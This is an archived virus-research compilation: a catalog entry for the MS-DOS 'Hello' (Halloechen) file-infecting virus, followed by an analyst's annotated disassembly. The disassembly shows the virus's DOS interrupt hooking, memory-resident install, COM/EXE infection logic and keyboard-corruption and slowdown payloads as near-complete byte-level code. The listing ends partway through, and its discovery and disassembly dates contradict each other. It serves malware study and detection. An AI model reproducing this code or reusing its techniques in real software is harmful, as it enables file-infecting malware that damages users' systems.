             *********************************************
             ***   Reports collected and collated by   ***
             ***            PC-Virus Index             ***
             ***      with full acknowledgements       ***
             ***            to the authors             ***
             *********************************************



====== Computer Virus Catalog 1.2: Hello Virus (14-February-1991) ====
Entry...............: Hello Virus
Alias(es)...........: Hello_1a=Hall(oe)chen (German, meaning "Hy!")
Virus Strain........: ---
Virus detected when.: January 1990
              where.: South-West-Germany
Length of Virus.....: 2011 Bytes
--------------------- Preconditions ----------------------------------
Operating System(s).: MS-DOS
Version/Release.....: 3.00+
Computer model(s)...: IBM compatibles
--------------------- Attributes -------------------------------------
Easy Identification.: Textstring: "Hall(oe)chen, here I'm"
                                  "Acrivate Level 1" (wrong syntax!)
Type of infection...: Link-Virus; Infects COM- and EXE-files
Infection Trigger...: Any program file with file-date different
                         from the system-date (only year/month)
Storage media affected: Floppy and harddisk
Interrupts hooked...: INT 21h, function 4Bh
                      INT 08h and INT 16h for Damage
Damage..............: Slows system down, corrupts keyboard-entries
                         (pressing "A" produces "B")
Damage Trigger......: Infection-level greater than 50 or 70
Particularities.....: The damage will not be activated.
Similarities........: ---
--------------------- Agents -----------------------------------------
Countermeasures.....: Scan V57+ (McAfee),
Countermeasures successful: CleanV57+
Standard means......: ---
--------------------- Acknowledgement --------------------------------
Location............: VTC-Hamburg, BIT-Karlsruhe
Classification......: Matthias Jaenichen, Christoph Fischer
Documentation by....: Matthias Jaenichen
Date................: 31-January-1990
Update..............: 14-February-1991
Information Source..: ---
===================== End of Hello - Virus ===========================




; virus Halloeche 
;
; founded in Poland in December 1990 
; 
; dissasembled by Andrzej Kadlof  October 18, 19, 1990 
; 

;===============================================
;              Virus entry point
;===============================================

; store SS and SP

0000 8CD0          MOV     AX,SS
0002 8BD4          MOV     DX,SP

0004 BC0200        MOV     SP,0002
0007 36            SS:
0008 8B0E0000      MOV     CX,[0000] ; store word before overwriting
000C E80000        CALL    000F      ; put own address on the stack
000F 5B            POP     BX        ; and get it back
0010 36            SS:
0011 890E0000      MOV     [0000],CX ; restore word overwited by CALL 
0015 81EB0F00      SUB     BX,000F   ; start of virus code
0019 8BF3          MOV     SI,BX     ; offset of virus in RAM
001B B104          MOV     CL,04     ; convert to paragraphs
001D D3EB          SHR     BX,CL
001F 8CC9          MOV     CX,CS
0021 03D9          ADD     BX,CX     ; segment of virus code
0023 8ED3          MOV     SS,BX     ; set own stack
0025 BCDB08        MOV     SP,08DB   ; top of virus stack
0028 53            PUSH    BX        ; normalized segment
0029 BB2E00        MOV     BX,002E   ; next entry point
002C 53            PUSH    BX
002D CB            RETF              ; jump to the ... next instruction

002E 2E            CS:
002F A38106        MOV     [0681],AX ; store oryginal SS
0032 2E            CS:
0033 89168306      MOV     [0683],DX ; store oryginal SP
0037 2E            CS:
0038 8936F900      MOV     [00F9],SI ; store virus offset in RAM
003C 2E            CS:
003D 890EFD00      MOV     [00FD],CX ; store oryginal carrier CS
0041 2E            CS:

0042 8C0EFF00      MOV     [00FF],CS ; store virus segment in RAM
0046 E96B04        JMP     04B4

; buffer for oryginal first 30h bytes of carrier program
;
;            if  EXE

0049  4D 5A    ; 'MZ'   
004B  BB 01    ; PartPag
004D  21 00    ; PageCnt
004F  02 00    ; ReloCnt
0051  00 20    ; HdrSize
0053  00 CD    ; MinMem 
0055  02 FF    ; MaxMem 
0057  FF B8    ; ReloSS 
0059  06 00    ; ExeSP  
005B  01 BA    ; ChkSum
005D  BA 53    ; ExeIP  
005F  23 00    ; ReloCS 
0061  00 1E    ; TablOff
0063  00 00    ; Overlay
0065  00 01 00 67 23 00 00 8A 23 00 00 00 00 00 00 00 00 
0075  00 00 00

0078  00       ; unused byte

; copy of DTA of carrier aplication

0079  00 00 00 00 00 00 00 00 00 00 0D 00 00 00 00 00
0089  00 00 00 00 00 00 00 00 00 00 0D 00 00 00 00 00
0099  00 00 00 00 00 00 00 00 00 00 0D 00 00 00 00 00
00A9  00 00 00 00 00 00 00 00 00 00 0D 00 00 00 00 00
00B9  00 00 00 00 00 00 00 00 00 00 0D 00 00 00 00 00
00C9  00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
00D9  00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
00E9  00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00

00F9  00 00      ; virus offset in RAM
00FB  05 00      ; number of bytes to write to file
00FD  6A 24      ; virus segment in RAM
00FF  6A 24      ; virus segment in RAM

; never displayed string

0101     48 61 6C 6C 94 63 68 65 6E 20 21 21 21 21 21    Hall.chen !!!!!
0110  21 2C 20 48 65 72 65 20 49 27 6D 0D 0A 24 41 63   !, Here I'm..$Ac
0120  72 69 76 61 74 65 20 4C 65 76 65 6C 20 31 0D 0A   rivate Level 1..
0130  24                                                $

; unused code

0131 50            PUSH    AX
0132 B409          MOV     AH,09     ; disply string
0134 CD21          INT     21

0136 33C0          XOR     AX,AX
0138 CD16          INT     16        ; wait for key

013A 58            POP     AX
013B C3            RET

013C FC 03        ; 
013E 60 14 6A 02  ; old INT 21h
0142 53 23        ; entry point for EXE file, for COM oryginal bytes (6)
0144 00 00        ; 
0146 6F 6E
0148 05 00        ; file handle
014A 00 00        ; flag  0000h .. 0032h do nothing
                  ;       0033h .. 0046h slow down computer
                  ;       0047h .. FFFFh start keyboard mulfunction
                  ; flag is increased after each succesfull infection

;-------------------
; store current DTA

014C 06            PUSH    ES
014D 1E            PUSH    DS
014E B462          MOV     AH,62     ; get PSP (to BX)
0150 CD21          INT     21

; copy DTA

0152 8EDB          MOV     DS,BX     ; current DTA segment
0154 8CC8          MOV     AX,CS     ; own buffer segment
0156 8EC0          MOV     ES,AX
0158 BE8000        MOV     SI,0080   ; DTA offset
015B BF7900        MOV     DI,0079   ; buffer offset
015E B98000        MOV     CX,0080   ; length of DTA
0161 FC            CLD
0162 F3            REPZ
0163 A4            MOVSB
0164 1F            POP     DS
0165 07            POP     ES
0166 C3            RET

0167 55 55         ; virus sygnature
0169 01            ; unused byte (??)

;---------------------
; restore current DTA

016A 06            PUSH    ES
016B 1E            PUSH    DS
016C B462          MOV     AH,62     ; get PSP
016E CD21          INT     21

0170 8EC3          MOV     ES,BX     ; current DTA
0172 8CC8          MOV     AX,CS     ; segment of buffer
0174 8ED8          MOV     DS,AX
0176 BF8000        MOV     DI,0080   ; offset of DTA
0179 BE7900        MOV     SI,0079   ; offset of buffer
017C B98000        MOV     CX,0080   ; length of DTA
017F FC            CLD
0180 F3            REPZ
0181 A4            MOVSB
0182 1F            POP     DS
0183 07            POP     ES
0184 C3            RET

0185 2E 3A 26 FF 0D  ; 5 swaped bytes of old INT 21h handler
018A 00 00 00 00     ; old INT 1
018E 00              ; traced instruction counter

;-----------------------------------------
; INT 1 handler

; first skip 7 instruction

018F 2E            CS:
0190 FE068E01      INC     BYTE PTR [018E]
0194 2E            CS:
0195 803E8E0107    CMP     BYTE PTR [018E],07
019A 7701          JA      019D

019C CF            IRET

019D 2E            CS:
019E C6068E0100    MOV     BYTE PTR [018E],00  ; reset instruction counter
01A3 55            PUSH    BP
01A4 8BEC          MOV     BP,SP
01A6 50            PUSH    AX
01A7 57            PUSH    DI
01A8 06            PUSH    ES

; restore INT 1

01A9 33C0          XOR     AX,AX
01AB 8EC0          MOV     ES,AX
01AD 2E            CS:
01AE A18A01        MOV     AX,[018A]    ; restore INT 1
01B1 26            ES:
01B2 A30400        MOV     [0004],AX
01B5 2E            CS:
01B6 A18C01        MOV     AX,[018C]
01B9 26            ES:
01BA A30600        MOV     [0006],AX

; overwrite first 5 bytes of INT 21h handler by jump to virus

01BD 2E            CS:
01BE C43E3E01      LES     DI,[013E]
01C2 26            ES:
01C3 C605EA        MOV     BYTE PTR [DI],EA
01C6 26            ES:
01C7 C74501B503    MOV     WORD PTR [DI+01],03B5
01CC 26            ES:
01CD 8C4D03        MOV     [DI+03],CS
01D0 8176060001    XOR     WORD PTR [BP+06],0100  ; reset trap flag
01D5 07            POP     ES
01D6 5F            POP     DI
01D7 58            POP     AX
01D8 5D            POP     BP
01D9 CF            IRET             ; continue old INT 21h

;--------------
; True INT 21h

01DA 50            PUSH    AX
01DB 57            PUSH    DI
01DC 06            PUSH    ES

; get INT 1

01DD 33C0          XOR     AX,AX
01DF 8EC0          MOV     ES,AX
01E1 26            ES:
01E2 A10400        MOV     AX,[0004]
01E5 2E            CS:
01E6 A38A01        MOV     [018A],AX
01E9 26            ES:
01EA A10600        MOV     AX,[0006]
01ED 2E            CS:
01EE A38C01        MOV     [018C],AX

; set new INT 1

01F1 26            ES:
01F2 C70604008F01  MOV     WORD PTR [0004],018F
01F8 26            ES:
01F9 8C0E0600      MOV     [0006],CS

; restore oryginal INT 21h handler routine

01FD FC            CLD
01FE 2E            CS:
01FF C43E3E01      LES   DI,[013E] ; address of swaped bytes in INT 21h handler
0203 FA            CLI
0204 2E            CS:
0205 A18501        MOV     AX,[0185]
0208 AB            STOSW
0209 2E            CS:
020A A18701        MOV     AX,[0187]
020D AB            STOSW
020E 2E            CS:
020F A08901        MOV     AL,[0189]
0212 AA            STOSB
0213 FB            STI

0214 07            POP     ES
0215 5F            POP     DI
0216 58            POP     AX
0217 83C402        ADD     SP,+02
021A 53            PUSH    BX
021B 9C            PUSHF
021C 5B            POP     BX
021D 81CB0001      OR      BX,0100   ; set trap flag
0221 53            PUSH    BX
0222 9D            POPF
0223 5B            POP     BX
0224 2E            CS:
0225 FF2E3E01      JMP     FAR [013E]  ; INT 21h

0229 00 00      ; offset of old INT 8 
022B 00 00      ; segment of old INT 8
022D 00         ; tick flag 00/FF
022E 00 00      ; coefficien of computer power, number of timer the pausing
                ; routine will be repeted

;-------------------------------------
; INT 8 handler, calibrate computer power

0230 2E            CS:
0231 80362D02FF    XOR     BYTE PTR [022D],FF
0236 2E            CS:
0237 FF2E2902      JMP     FAR [0229]    ; old INT 8

023B EA            ; fake byte

;------------------------------------
; INT 8 handler (slow down computer)

023C 50            PUSH    AX
023D 53            PUSH    BX
023E 52            PUSH    DX
023F 51            PUSH    CX
0240 2E            CS:
0241 8B0E2E02      MOV     CX,[022E]  ; coefficient of slow down

; pause

0245 33D2          XOR     DX,DX
0247 B82909        MOV     AX,0929
024A BB6400        MOV     BX,0064
024D F7FB          IDIV    BX
024F 33D2          XOR     DX,DX
0251 F7FB          IDIV    BX
0253 E2F0          LOOP    0245

; exit

0255 59            POP     CX
0256 5A            POP     DX
0257 5B            POP     BX
0258 58            POP     AX
0259 2E            CS:
025A FF2E2902      JMP     FAR [0229]  ; old INT 8

025E 00            ; flag 
                   ;    00h - INT 8 not intercepted
                   ;    FFh - INT 8 intercepted

;------------------------------------------------------------------
; found the factor for slow down routine and activate those routine

025F FB            STI
0260 803E5E02FF    CMP     BYTE PTR [025E],FF  ; is INT 8 intercepted?
0265 7412          JZ      0279       ; yes

0267 B80835        MOV     AX,3508    ; get INT 8 (timer)
026A CD21          INT     21

026C 891E2902      MOV     [0229],BX  ; store it
0270 8C062B02      MOV     [022B],ES
0274 C6065E02FF    MOV     BYTE PTR [025E],FF  ; INT 8 is now under control

0279 BA3002        MOV     DX,0230    ; offset of calibrate computer power
027C B80825        MOV     AX,2508
027F CD21          INT     21         ; set INT 8

0281 C6062D0200    MOV     BYTE PTR [022D],00 ; reset tick counter
0286 B9FFFF        MOV     CX,FFFF

0289 803E2D02FF    CMP     BYTE PTR [022D],FF ; wait (INT 8 do the job!)
028E 75F9          JNZ     0289

; test routine, check how many times it will be executed between two clock
; ticks

0290 33D2          XOR     DX,DX     ; prepare division
0292 B84523        MOV     AX,2345
0295 BB6400        MOV     BX,0064
0298 F7FB          IDIV    BX
029A 33D2          XOR     DX,DX
029C F7FB          IDIV    BX

029E 803E2D0200    CMP     BYTE PTR [022D],00  ; there was tick?
02A3 7402          JZ      02A7                ; yes

02A5 E2E9          LOOP    0290

; compute coefficient

02A7 B8FFFF        MOV     AX,FFFF   ; initial value of CX
02AA 2BC1          SUB     AX,CX     ; get difference
02AC B105          MOV     CL,05     ; multiple by 32
02AE D3E8          SHR     AX,CL
02B0 8B1E4A01      MOV     BX,[014A] ; virus generation number
02B4 83EB32        SUB     BX,+32    ; subtract no efects level
02B7 83FB40        CMP     BX,+40    ; compare wit full efects
02BA 7203          JB      02BF

02BC BB4000        MOV     BX,0040   ; maximum acceptable value for BX

02BF F7E3          MUL     BX
02C1 A32E02        MOV     [022E],AX ; set coefficient of computer power
02C4 BA3C02        MOV     DX,023C   ; offset of slow down routine
02C7 B80825        MOV     AX,2508   ; set INT 8
02CA CD21          INT     21

02CC C3            RET

02CD EA            ; fake byte

02CE 00 00 00 00   ; old INT 16
02D2 00            ; flag FF - INT 16h is intercepted, other value - no
02D3 00            ; coefficient, regulate probability of keyboard problems 

;---------------------
; new INT 16h handler

02D4 55            PUSH    BP
02D5 8BEC          MOV     BP,SP
02D7 9C            PUSHF
02D8 2E            CS:
02D9 FF1ECE02      CALL    FAR [02CE]  ; old INT 16h

02DD 50            PUSH    AX
02DE 1E            PUSH    DS
02DF 9C            PUSHF
02E0 58            POP     AX
02E1 894606        MOV     [BP+06],AX  ; caller flags
02E4 B84000        MOV     AX,0040     ; segment of BIOS date area
02E7 8ED8          MOV     DS,AX
02E9 A06C00        MOV     AL,[006C]   ; time counter
02EC 2E            CS:
02ED 0206D302      ADD     AL,[02D3]   ; coefficient of falsification
02F1 1F            POP     DS
02F2 58            POP     AX
02F3 7306          JAE     02FB        ; exit

02F5 3C20          CMP     AL,20       ; ' '
02F7 7202          JB      02FB        ; exit

02F9 FEC0          INC     AL          ; false key code

02FB 5D            POP     BP
02FC CF            IRET

;-----------------------------
; start keyboard malfunction

02FD 8CC8          MOV     AX,CS
02FF 8ED8          MOV     DS,AX
0301 803ED202FF    CMP     BYTE PTR [02D2],FF  ; is known old INT 16h?
0306 7412          JZ      031A      ; yes

0308 B81635        MOV     AX,3516   ; get INT 16h (keybord)
030B CD21          INT     21

030D 891ECE02      MOV     [02CE],BX
0311 8C06D002      MOV     [02D0],ES
0315 C606D202FF    MOV     BYTE PTR [02D2],FF  ; set flag

031A A14A01        MOV     AX,[014A]  ; wirus generation counter
031D 2D4600        SUB     AX,0046    ; 
0320 D1E8          SHR     AX,1
0322 A2D302        MOV     [02D3],AL  ; initial probability coefficient
0325 B81625        MOV     AX,2516    ; set INT 16h
0328 BAD402        MOV     DX,02D4    ; offset of new INT 16h handler
032B CD21          INT     21

032D C3            RET


032E EA       ; fake byte

;---------------------------------------------------------------------
; check flag and start virus show (slow down or keyboard malfanction)

032F FB            STI
0330 8CC8          MOV     AX,CS
0332 8ED8          MOV     DS,AX
0334 2E            CS:
0335 833E4A0133    CMP     WORD PTR [014A],+33
033A 720E          JB      034A      ; RET

033C E820FF        CALL    025F      ; activate slow down routine

033F 2E            CS:
0340 833E4A0147    CMP     WORD PTR [014A],+47
0345 7203          JB      034A      ; RET

0347 E8B3FF        CALL    02FD      ; start keyboard malfunction

034A C3            RET

;----------------
; INT 24 handler

034B B80300        MOV     AX,0003
034E CF            IRET

034F  EA 1D 70 00      ; old INT 13h
0353  1F 1D 70 00      ; old INT 13h
0357  60 14 6A 02      ; old INT 21h
035B  56 05 84 0C      ; old INT 24h
035F  EA               ; fake byte

;-----------------------------------------
; capture interrupt vectors 13h, 21h, 24h

0360 1E            PUSH    DS
0361 33C0          XOR     AX,AX
0363 8ED8          MOV     DS,AX
0365 8CC8          MOV     AX,CS
0367 8EC0          MOV     ES,AX
0369 FC            CLD

036A BE8400        MOV     SI,0084   ; offset of INT 21h vector
036D BF5703        MOV     DI,0357   ; destination
0370 B90200        MOV     CX,0002   ; number of words
0373 F3            REPZ
0374 A5            MOVSW             ; move

0375 BE4C00        MOV     SI,004C   ; offset of INT 13h
0378 BF5303        MOV     DI,0353   ; destination
037B B90200        MOV     CX,0002   ; number of words
037E F3            REPZ
037F A5            MOVSW             ; move

0380 BE9000        MOV     SI,0090   ; offset of INT 24h
0383 BF5B03        MOV     DI,035B   ; destination
0386 B90200        MOV     CX,0002   ; number of words
0389 F3            REPZ
038A A5            MOVSW             ; move

038B 8CC0          MOV     AX,ES
038D 8CDB          MOV     BX,DS
038F 8EC3          MOV     ES,BX
0391 8ED8          MOV     DS,AX
0393 BE3E01        MOV     SI,013E
0396 BF8400        MOV     DI,0084   ; set INT 21h
0399 B90200        MOV     CX,0002
039C F3            REPZ
039D A5            MOVSW

039E BE4F03        MOV     SI,034F
03A1 BF4C00        MOV     DI,004C   ; set INT 13h
03A4 B90200        MOV     CX,0002
03A7 F3            REPZ
03A8 A5            MOVSW

03A9 BF9000        MOV     DI,0090   ; set INT 24h
03AC B84B03        MOV     AX,034B
03AF AB            STOSW
03B0 8CC8          MOV     AX,CS
03B2 AB            STOSW
03B3 1F            POP     DS
03B4 C3            RET

;-----------------
; INT 21h handler

03B5 80FC4B        CMP     AH,4B   ; Load & Execute
03B8 7403          JZ      03BD

03BA E81DFE        CALL    01DA    ; true INT 21h, it is JUMP!

03BD 50            PUSH    AX
03BE 53            PUSH    BX
03BF 51            PUSH    CX
03C0 52            PUSH    DX
03C1 56            PUSH    SI
03C2 57            PUSH    DI
03C3 06            PUSH    ES
03C4 1E            PUSH    DS
03C5 2E            CS:
03C6 FF364A01      PUSH    [014A]    ; generation number
03CA 8BF2          MOV     SI,DX     ; path to file name
03CC 8A04          MOV     AL,[SI]   ; first character
03CE 3C61          CMP     AL,61     ; 'a'
03D0 7702          JA      03D4

03D2 0420          ADD     AL,20     ; convert to lower case
03D4 3C62          CMP     AL,62     ; 'b'
03D6 7707          JA      03DF

; file is loaded from drive A or B or from default drive but the path name
; start with the letters A or B; in this case block special effects during
; infection

03D8 2E            CS:
03D9 C7064A010000  MOV     WORD PTR [014A],0000  ; stop virus show

03DF E87EFF        CALL    0360      ; capture interrupt vectors 13h, 21h, 24h

03E2 1E            PUSH    DS
03E3 52            PUSH    DX
03E4 E80502        CALL    05EC      ; get and store file attributes

03E7 7220          JB      0409      ; skip infection

03E9 B8023D        MOV     AX,3D02   ; open file
03EC CD21          INT     21

03EE 7219          JB      0409      ; skip infection

03F0 2E            CS:
03F1 A34801        MOV     [0148],AX ; store file handle
03F4 E81202        CALL    0609      ; is it this year/month file

03F7 7206          JB      03FF      ; yes

03F9 E85F02        CALL    065B      ; infect loaded file and store its DTA
03FC E84702        CALL    0646      ; restore file time and date stamp

03FF B8003E        MOV     AX,3E00   ; close file
0402 2E            CS:
0403 8B1E4801      MOV     BX,[0148] ; file handle
0407 CD21          INT     21

0409 1F            POP     DS
040A 5A            POP     DX
040B E8F001        CALL    05FE      ; restore file attributes

040E FC            CLD

; restore INT 21h

040F 33C0          XOR     AX,AX
0411 8EC0          MOV     ES,AX
0413 8CC8          MOV     AX,CS
0415 8ED8          MOV     DS,AX
0417 BE5703        MOV     SI,0357
041A BF8400        MOV     DI,0084
041D B90200        MOV     CX,0002
0420 F3            REPZ
0421 A5            MOVSW

; restore INT 13h

0422 BE5303        MOV     SI,0353
0425 BF4C00        MOV     DI,004C
0428 B90200        MOV     CX,0002
042B F3            REPZ
042C A5            MOVSW

; restore INT 24h

042D BE5B03        MOV     SI,035B
0430 BF9000        MOV     DI,0090
0433 B90200        MOV     CX,0002
0436 F3            REPZ
0437 A5            MOVSW

0438 B40D          MOV     AH,0D
043A CD21          INT     21         ; reset disk

043C E8F0FE        CALL    032F       ; start virus show

043F 2E            CS:
0440 8F064A01      POP     [014A]  ; virus show flag
0444 1F            POP     DS
0445 07            POP     ES
0446 5F            POP     DI
0447 5E            POP     SI
0448 5A            POP     DX
0449 59            POP     CX
044A 5B            POP     BX
044B 58            POP     AX
044C E88BFD        CALL    01DA    ; true INT 21h, it is JUMP

044F 17            ; fake byte

;-----------------------------------------
; remember INT 13h and intercept INT 21h

0450 B81335        MOV     AX,3513    ; get INT 13h
0453 CD21          INT     21

0455 2E            CS:
0456 891E4F03      MOV     [034F],BX
045A 2E            CS:
045B 8C065103      MOV     [0351],ES

045F 1E            PUSH    DS
0460 06            PUSH    ES
0461 8CC8          MOV     AX,CS
0463 8ED8          MOV     DS,AX
0465 B82135        MOV     AX,3521     ; get INT 21h
0468 CD21          INT     21

046A 891E3E01      MOV     [013E],BX
046E 8C064001      MOV     [0140],ES

; store first 5 bytes of old INT 21h handler

0472 26            ES:
0473 8B07          MOV     AX,[BX]
0475 A38501        MOV     [0185],AX
0478 26            ES:
0479 8B4702        MOV     AX,[BX+02]
047C A38701        MOV     [0187],AX
047F 26            ES:
0480 8A4704        MOV     AL,[BX+04]
0483 A28901        MOV     [0189],AL

; and replace them by jump to virus code

0486 FA            CLI
0487 26            ES:
0488 C607EA        MOV     BYTE PTR [BX],EA
048B 26            ES:
048C C74701B503    MOV     WORD PTR [BX+01],03B5
0491 26            ES:
0492 8C4F03        MOV     [BX+03],CS
0495 FB            STI

0496 07            POP     ES
0497 1F            POP     DS
0498 C3            RET

;---------------------
; search for last MCB

0499 B452          MOV     AH,52      ; get address of DOS list of list
049B CD21          INT     21

049D 26            ES:
049E 8B47FE        MOV     AX,[BX-02] ; first MCB
04A1 8ED8          MOV     DS,AX

04A3 8B1E0300      MOV     BX,[0003]  ; size of block
04A7 43            INC     BX         ; add size of MCB info block
04A8 03C3          ADD     AX,BX
04AA 8ED8          MOV     DS,AX      ; segment of next MCB
04AC 803E00005A    CMP     BYTE PTR [0000],5A ; 'Z' last MCB
04B1 75F0          JNZ     04A3

04B3 C3            RET

;-----------------------------
; continue virus initial code

04B4 06            PUSH    ES
04B5 1E            PUSH    DS
04B6 8CC8          MOV     AX,CS
04B8 8ED8          MOV     DS,AX
04BA 8EC0          MOV     ES,AX
04BC B430          MOV     AH,30     ; get DOS version
04BE CD21          INT     21

04C0 3C03          CMP     AL,03     ; major version
04C2 7233          JB      04F7      ; jump to application

; code executed only under DOS 3.x

04C4 BADB07        MOV     DX,07DB  ; virus length
04C7 B104          MOV     CL,04
04C9 D3EA          SHR     DX,CL    ; convert to paragraphs
04CB 83C203        ADD     DX,+03   ; size of private stack
04CE 52            PUSH    DX       ; store
04CF E8C7FF        CALL    0499     ; search for last MCB

04D2 5A            POP     DX
04D3 8B1E0300      MOV     BX,[0003]  ; size of block
04D7 03C3          ADD     AX,BX    ; point above last bloc
04D9 40            INC     AX       ; MBC info block size
04DA 8EC0          MOV     ES,AX
04DC 26            ES:
04DD 813E67015555  CMP     WORD PTR [0167],5555  ; virus marker
04E3 7403          JZ      04E8

04E5 E98800        JMP     0570     ; instal resident part

; virus instaled in memory, set virus generation number if higher

04E8 2E            CS:
04E9 A14A01        MOV     AX,[014A]  ; generation number
04EC 26            ES:
04ED 39064A01      CMP     [014A],AX  ; generation number
04F1 7304          JAE     04F7

04F3 26            ES:
04F4 A34A01        MOV     [014A],AX  ; generation number

; code for all versions of DOS, jump to the aplication

04F7 1F            POP     DS
04F8 07            POP     ES
04F9 2E            CS:
04FA 833EF90000    CMP     WORD PTR [00F9],+00 ; virus offset in RAM
04FF 752E          JNZ     052F        ; jump to application which is COM file

; jump to application which is EXE file

0501 2E            CS:
0502 8B1E8106      MOV     BX,[0681] ; restore SS
0506 8ED3          MOV     SS,BX
0508 2E            CS:
0509 8B268306      MOV     SP,[0683] ; restore SP
050D 2E            CS:
050E 8B0EFF00      MOV     CX,[00FF] ; virus segment in RAM
0512 2E            CS:
0513 2B0E3C01      SUB     CX,[013C] ; relative CS 
0517 2E            CS:
0518 010E4401      ADD     [0144],CX ; oryginal CS of application
051C 33C0          XOR     AX,AX     ; clear registers
051E 33DB          XOR     BX,BX
0520 33C9          XOR     CX,CX
0522 33D2          XOR     DX,DX
0524 33ED          XOR     BP,BP
0526 33FF          XOR     DI,DI
0528 33F6          XOR     SI,SI
052A 2E            CS:
052B FF2E4201      JMP     FAR [0142] ; jump to EXE

; jump to application which is COM file

052F 2E            CS:
0530 8B0E8106      MOV     CX,[0681]  ; restore SS
0534 8ED1          MOV     SS,CX
0536 2E            CS:
0537 8B268306      MOV     SP,[0683]  ; restore SP

; restore first 6 oryginal COM bytes

053B 2E            CS:
053C 8B1E4201      MOV     BX,[0142]
0540 891E0001      MOV     [0100],BX
0544 2E            CS:
0545 8B1E4401      MOV     BX,[0144]
0549 891E0201      MOV     [0102],BX
054D 2E            CS:
054E 8B1E4601      MOV     BX,[0146]
0552 891E0401      MOV     [0104],BX
0556 2E            CS:
0557 FF36FD00      PUSH    [00FD]    ; oryginal CS
055B B90001        MOV     CX,0100   ; entry point for COM
055E 51            PUSH    CX
055F 33C0          XOR     AX,AX     ; clear registers
0561 33DB          XOR     BX,BX
0563 33C9          XOR     CX,CX
0565 33D2          XOR     DX,DX
0567 33ED          XOR     BP,BP
0569 33FF          XOR     DI,DI
056B 33F6          XOR     SI,SI
056D CB            RETF              ; jump to COM

056E 2E 03         ; unused

;-----------------------
; instal resident part 
; AX - segment above last MCB
; DS - last MCB

0570 8CCB          MOV     BX,CS      ; virus segment
0572 03DA          ADD     BX,DX      ; virus length in paragraphs
0574 81C30010      ADD     BX,1000    ; 64K
0578 3BC3          CMP     AX,BX
057A 7703          JA      057F       ; OK, continue

057C E978FF        JMP     04F7       ; out of memory, jump to the aplication

057F B462          MOV     AH,62      ; get PSP
0581 CD21          INT     21

0583 8EC3          MOV     ES,BX
0585 26            ES:
0586 29160200      SUB     [0002],DX  ; memory size minus virus size in PSP
058A 29160300      SUB     [0003],DX  ; reflect this change in MCB too
058E A10300        MOV     AX,[0003]  ; old MCB size
0591 8CDB          MOV     BX,DS      ; 
0593 03C3          ADD     AX,BX
0595 40            INC     AX         ; size of MCB info block
0596 8EC0          MOV     ES,AX      ; segment of virus in memory
0598 8CC8          MOV     AX,CS      ; current virus segment
059A 8ED8          MOV     DS,AX
059C BF0000        MOV     DI,0000
059F BE0000        MOV     SI,0000
05A2 B9DB07        MOV     CX,07DB    ; virus size
05A5 FC            CLD
05A6 F3            REPZ
05A7 A4            MOVSB              ; move onto new place
05A8 06            PUSH    ES
05A9 BBAE05        MOV     BX,05AE    ; continue in new place
05AC 53            PUSH    BX
05AD CB            RETF               ; far jump to the next instruction

05AE 8CC8          MOV     AX,CS
05B0 8ED8          MOV     DS,AX
05B2 C6065E0200    MOV     BYTE PTR [025E],00
05B7 C606D20200    MOV     BYTE PTR [02D2],00 ; signal: INT 16h is not captured
05BC E891FE        CALL    0450      ; intercept INT 13h and 21h

05BF E935FF        JMP     04F7      ; jump to the aplication

;----------------------------------
; move file pointer from beginning

05C2 B80042        MOV     AX,4200    ; move file pointer from beginning
05C5 8B1E4801      MOV     BX,[0148]
05C9 CD21          INT     21

05CB C3            RET

;-----------------
; read from file

05CC 8B1E4801      MOV     BX,[0148]
05D0 B43F          MOV     AH,3F       ; read file
05D2 8B0EFB00      MOV     CX,[00FB]
05D6 CD21          INT     21

05D8 C3            RET

;-------------
; write file

05D9 8B1E4801      MOV     BX,[0148]
05DD 8B0EFB00      MOV     CX,[00FB]
05E1 B440          MOV     AH,40        ; write file
05E3 CD21          INT     21

05E5 C3            RET


05E6  20 7B    ; file time
05E8  A8 0E    ; file date
05EA  00 00    ; file attributes

;------------------------------
; get and store file attributes

05EC B80043        MOV     AX,4300   ; get file attributes
05EF CD21          INT     21

05F1 2E            CS:
05F2 890EEA05      MOV     [05EA],CX ; store oryginals
05F6 33C9          XOR     CX,CX     ; clear all
05F8 B80143        MOV     AX,4301   ; set file attributes
05FB CD21          INT     21

05FD C3            RET

;-------------------------
; restore file attributes

05FE B80143        MOV     AX,4301   ; set file attributes
0601 2E            CS:
0602 8B0EEA05      MOV     CX,[05EA] ; restore oryginals
0606 CD21          INT     21
0608 C3            RET

;------------------------------
; is it this year/month file

0609 B80057        MOV     AX,5700    ; get time/date stamp
060C 2E            CS:
060D 8B1E4801      MOV     BX,[0148]  ; file handle
0611 CD21          INT     21

0613 2E            CS:
0614 8916E805      MOV     [05E8],DX  ; store date
0618 2E            CS:
0619 890EE605      MOV     [05E6],CX  ; store time

; get month from file date stamp 

061D 8BDA          MOV     BX,DX
061F B105          MOV     CL,05
0621 D3EB          SHR     BX,CL       ; discard days
0623 53            PUSH    BX          ; store month and year on stack
0624 83E30F        AND     BX,+0F

0627 B42A          MOV     AH,2A       ; get DOS date
0629 CD21          INT     21

062B 3AF3          CMP     DH,BL       ; DOS month
062D 7403          JZ      0632        ; equal

062F 5B            POP     BX

0630 F8            CLC                 ; dates are different
0631 C3            RET

; DOS and file date stamp months are the same

0632 5B            POP     BX          ; restore file month and year
0633 8BD1          MOV     DX,CX       ; store DOS year
0635 B104          MOV     CL,04
0637 D3EB          SHR     BX,CL       ; discard month
0639 83E37F        AND     BX,+7F
063C 81EABC07      SUB     DX,07BC     ; 1980
0640 3BDA          CMP     BX,DX       ; compare years
0642 75EC          JNZ     0630

0644 F9            STC
0645 C3            RET

;----------------------------------
; restore file time and date stamp

0646 2E            CS:
0647 8B1E4801      MOV     BX,[0148]  ; file handle
064B 2E            CS:
064C 8B0EE605      MOV     CX,[05E6]  ; time
0650 2E            CS:
0651 8B16E805      MOV     DX,[05E8]  ; date
0655 B80157        MOV     AX,5701    ; set file time/date stamp
0658 CD21          INT     21

065A C3            RET

;--------------------------------------
; infect loaded file and store its DTA

065B 8CC8          MOV     AX,CS
065D 8ED8          MOV     DS,AX
065F E8EAFA        CALL    014C     ; store victim DTA

0662 C706FB003000  MOV     WORD PTR [00FB],0030  ; number of bytes
0668 BA4900        MOV     DX,0049  ; buffer offset
066B E85EFF        CALL    05CC     ; read from file

066E 813E49004D5A  CMP     WORD PTR [0049],5A4D  ; file type
0674 7407          JZ      067D     ; EXE

0676 E8C600        CALL    073F     ; infect COM

0679 E8EEFA        CALL    016A     ; restore DTA of victim
067C C3            RET

067D E80500        CALL    0685     ; infect EXE file

